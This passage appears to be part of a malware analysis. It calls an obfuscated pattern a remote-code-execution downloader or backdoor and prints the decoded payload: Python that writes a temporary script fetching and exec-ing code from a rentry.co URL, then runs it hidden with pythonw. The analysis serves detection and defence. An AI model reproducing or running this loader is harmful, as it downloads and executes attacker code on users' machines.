This is a classic pattern for remote code execution and is highly indicative of malware, such as a downloader or backdoor. The use of obfuscation and dynamic code execution further confirms malicious intent.",

The base64-decoded payload is: `from tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://rentry.co/7nqxy/raw').read())\"\"\")\n_ttmp.close()\ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass`.
